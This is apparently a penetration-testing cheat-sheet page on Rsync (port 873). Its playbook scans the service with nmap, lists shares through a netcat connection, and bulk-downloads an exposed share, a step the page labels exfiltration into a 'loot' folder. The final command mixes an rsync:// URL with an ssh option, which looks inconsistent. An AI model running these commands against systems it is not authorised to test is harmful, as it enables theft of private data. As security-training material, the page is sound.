# Rsync (873)

Use this page to enumerate Rsync shares and identify exposed data quickly.

### Rsync

Rsync is a highly flexible network utility optimized to mirror, copy, and synchronize files locally or across remote endpoints using TCP port `873`.

### The delta-transfer core

* **Mechanism** — Rsync limits network resource strain via its native delta-transfer algorithm.
* **Operation** — instead of copying whole files, it scans modification timelines and size variations to isolate and transfer only the explicit byte differences between the source and target.

### Security exposures

#### Anonymous data looting

If an administrator exposes a directory share publicly without setting up access controls or password parameters, any external asset can list and download the target backup repository.

### Footprinting and share enumeration playbook

#### Step 1: Detect service version

```bash
sudo nmap -sV -p 873 <TARGET_IP>
```

#### Step 2: Query for available directory share contexts

```bash
nc -nv <TARGET_IP> 873
# Once connected, type the following command directly into the socket:
#list
```

#### Step 3: Enumerate shared directory file inventories

```bash
# Review files inside an identified target share (for example, 'dev')
rsync -av --list-only rsync://<TARGET_IP>/dev
```

#### Step 4: Mirror and exfiltrate the data

```bash
# Bulk download everything inside the exposed target share locally
rsync -av rsync://<TARGET_IP>/dev ./local_loot_folder/

# If Rsync routes via an alternative, non-standard SSH port setup:
rsync -av -e "ssh -p <PORT>" rsync://<TARGET_IP>/share_name ./local_folder/
```
